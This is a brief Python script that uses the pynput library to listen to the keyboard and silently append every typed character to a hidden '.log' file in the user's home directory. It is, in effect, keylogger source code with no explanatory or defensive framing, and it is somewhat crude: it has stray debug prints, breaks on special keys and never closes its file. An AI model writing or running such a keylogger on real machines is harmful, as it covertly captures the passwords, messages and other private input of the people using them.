from pynput import keyboard
from os import path, getenv

LOG_PATH = getenv("HOME") + "/.log"

def main():
    # Check if file exists 
    if not (path.isfile(LOG_PATH)):
        log_file = open(LOG_PATH, "w")
        print("d")
    elif(path.isfile(LOG_PATH)): 
        log_file = open(LOG_PATH, "a")
        print(LOG_PATH)
    
    def on_press(key):
        log_file.write(key.char)

    # Collect events until released
    with keyboard.Listener(
            on_press=on_press) as listener:
        listener.join()


if(__name__ == "__main__"):
    main()
